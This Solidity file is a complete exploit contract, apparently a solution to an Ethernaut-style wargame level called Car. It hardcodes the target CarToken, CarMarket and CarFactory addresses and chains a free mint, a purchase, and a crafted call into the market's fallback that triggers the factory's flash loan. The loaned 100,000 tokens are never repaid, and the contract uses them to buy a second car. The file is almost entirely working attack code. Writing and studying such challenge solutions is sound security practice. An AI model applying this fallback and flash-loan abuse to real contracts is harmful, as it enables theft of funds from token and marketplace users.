// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
import './src/CarFactory.sol';
import './src/CarMarket.sol';
import './src/CarToken.sol';

//import 'hardhat/console.sol';

contract EthernautCarExploitV2 {
  address internal constant carToken = 0x66408824A99FF61ae2e032E3c7a461DED1a6718E;
  address internal constant carMarket = 0x07AbFccEd19Aeb5148C284Cd39a9ff2Ac835960A;
  address internal constant carFactory = 0x012f0c715725683A5405B596f4F55D4AD3046854;
  uint256 internal constant amount = 100_000 ether;

  function execute() external {
    // Get the free CarToken
    CarToken(carToken).mint();
    // Allow the marketplace to pull the CarToken
    CarToken(carToken).approve(carMarket, type(uint256).max);
    // Purchase the first car cost the amount of CarToken generated before
    CarMarket(carMarket).purchaseCar('color 1', 'model 1', 'plateNumber 1');
    // Prepare the encoded data to call the CarMarket fallback to call the CarFactory flash loan
    bytes memory data = abi.encodeWithSelector(CarFactory.flashLoan.selector, amount);
    // Call the fallback
    (bool success, ) = carMarket.call(data);
    require(success, 'Call fallback failed');
    // Now contract have keep the 100k transferred from the CarMarket (CarFactory balance unchanged)
    // We can purchase another car for the same cost as the first one
    CarMarket(carMarket).purchaseCar('color 2', 'model 2', 'plateNumber 2');
  }

  function receivedCarToken(address _carFactory) external {
    // flash loan hook callback, nothing need to be done because token will not be sent back anyway
  }
}
